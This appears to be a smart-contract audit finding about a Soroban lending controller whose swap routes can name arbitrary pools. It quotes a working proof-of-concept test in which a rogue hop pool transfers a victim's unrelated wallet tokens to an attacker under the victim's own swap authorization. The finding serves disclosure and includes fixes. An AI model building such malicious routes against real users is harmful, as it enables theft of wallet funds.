### Title
Unrestricted external addresses in router payload let a crafted swap route steal the signer's unrelated wallet tokens under their own authorization - ([File: contracts/controller/src/strategies/swap.rs](contracts/controller/src/strategies/swap.rs))

### Summary
The XXE bug class — a parser resolving externally supplied references by default — maps onto the controller's strategy swap path. `swap_tokens` forwards a fully attacker/caller-supplied `StrategySwap` payload to the router without restricting which token, pool, or venue addresses it names. Because Soroban records any `require_auth`-gated call made deeper in the route as a child of the caller's top-level authorization entry, a crafted route can attach a `token.transfer(victim, attacker, amount)` for an unrelated wallet token beneath the victim's `swap_collateral`/`multiply`/`swap_debt`/`repay_debt_with_collateral` signature. If the victim signs that tree, the wallet funds are stolen; nothing in the controller, the payload minimum, or the final risk gate bounds the loss.

### Finding Description
`process_swap_collateral` and the other strategy verbs accept `swap: &StrategySwap` as an argument and pass it unchanged into `swap_tokens` [1](#0-0) . `swap_tokens` only constrains the controller's own grant — one exact `token_in.transfer(controller, router, amount_in)` via `authorize_transfer_as_current` — then invokes `router.execute_strategy(&controller, &amount_in, swap)` inside a flash guard [2](#0-1) . Post-checks verify only the controller's input spend and a positive measured output [3](#0-2) ; no allowlist constrains the addresses the payload names.

The in-repo threat model states the resulting exposure directly: "the router calls the pool and token addresses its payload names and keeps no allowlist of them, so a route can put third-party code on the call stack below the caller's authorization. A token transfer that such code makes from the caller ... executes if the caller signs that tree. The loss is then the caller's wallet, not the routed amount, and neither the payload minimum nor the final risk gate bounds it" [4](#0-3) . The invariant doc confirms the mitigation only "covers the controller's own grant" [5](#0-4) .

### Impact Explanation
Theft of user funds. An honest route produces an authorization tree with no child entries under the strategy call (or exactly one input transfer on a direct router swap). A malicious route adds a child `transfer` of any token the victim holds to the attacker's address. The test `simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry` demonstrates the end state: Alice's unrelated `wallet_token` balance of `77_770_000_000` moves to the attacker while her `swap_collateral` completes normally and her new ETH collateral is credited [6](#0-5) .

### Likelihood Explanation
Medium/low. Exploitation requires the victim to sign an authorization tree containing the malicious child entry — i.e., the crafted `swap` bytes must reach a victim (via a malicious/compromised quote source, phishing UI, or malicious counterparty) and the victim's wallet must sign the poisoned tree without inspection. The signer is the victim, not the attacker, so a single unprivileged address cannot execute it unilaterally; however, the route bytes are a normal unauthenticated argument to `swap_collateral`, `swap_debt`, `repay_debt_with_collateral`, and `multiply`, and the protocol's defense rests entirely on every client decoding routes and rejecting unexpected child auth entries, which the code does not enforce on-chain.

### Recommendation
Constrain the external references the route can name, the on-chain analog of disabling external entity resolution:
- Restrict hop venues in the router to a governance-managed venue/pool allowlist, or
- Have the controller pin the set of token addresses a strategy payload may reference to the swap's declared `token_in`/`token_out`, rejecting payloads naming other contracts, or
- At minimum, enforce at the SDK/wallet layer that the simulated authorization tree under a strategy entrypoint contains zero child invocations, and surface a hard warning otherwise.

### Proof of Concept
`tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs` is a working PoC. `Scene::new` registers `UnlistedPoolRouter` (a router double that calls whatever `hop_pool` the payload names) and mints `WALLET_BALANCE` of an unlisted token to Alice [7](#0-6) . `route_through_pool_stealing` encodes a route whose hop pool is a `RogueHopPool` that executes `token.transfer(victim, attacker, amount)` inside `swap` [8](#0-7) [9](#0-8) . The test shows recording-mode simulation attaches that transfer as a child of Alice's `swap_collateral` auth entry; if signed, `wallet(alice) == 0`, `wallet(attacker) == WALLET_BALANCE`, while the strategy itself succeeds [10](#0-9) .

### Citations

**File:** contracts/controller/src/strategies/swap_collateral.rs (L55-65)
```rust
    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
    );
```

**File:** contracts/controller/src/strategies/swap.rs (L33-38)
```rust
    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/controller/src/strategies/swap.rs (L40-54)
```rust
    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** docs/explanation/threat-model.md (L154-165)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
user.
```

**File:** docs/reference/invariants.md (L632-640)
```markdown
### INV-STRAT-01 — Controller router authority binds one input transfer

The controller authorizes one exact
`token_in.transfer(controller, configured_router, amount_in)` invocation,
without sub-invocations. This grants invocation authority, without a token
allowance.

The controller ignores the router's return value, rejects input-balance growth
and rejects measured spending above `amount_in`.
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L62-71)
```rust
    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L82-109)
```rust
impl Scene {
    /// Debt-free Alice with 10 000 USDC supplied and an unrelated token in her wallet.
    fn new() -> Self {
        let mut t = LendingTest::new().standard_two_asset().build();
        t.supply(ALICE, "USDC", 10_000.0);
        let alice = t.get_or_create_user(ALICE);
        let account_id = t.resolve_account_id(ALICE);

        let router = t.env.register(UnlistedPoolRouter, ());
        t.ctrl_client().set_swap_aggregator(&router);
        t.resolve_market("ETH")
            .token_admin
            .mint(&router, &(4 * FAIR_OUT_ETH));

        let wallet_token = t
            .env
            .register_stellar_asset_contract_v2(t.admin.clone())
            .address();
        token::StellarAssetClient::new(&t.env, &wallet_token).mint(&alice, &WALLET_BALANCE);
        let attacker = Address::generate(&t.env);
        Self {
            t,
            alice,
            attacker,
            wallet_token,
            account_id,
        }
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L111-125)
```rust
    fn route_through_pool_stealing(&self, amount: i128) -> Bytes {
        let plan = (
            self.alice.clone(),
            self.wallet_token.clone(),
            self.attacker.clone(),
            amount,
        );
        RoutedSwap {
            hop_pool: self.t.env.register(RogueHopPool, plan),
            min_out: FAIR_OUT_ETH,
            token_in: self.t.resolve_asset("USDC"),
            token_out: self.t.resolve_asset("ETH"),
        }
        .to_xdr(&self.t.env)
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-226)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
```
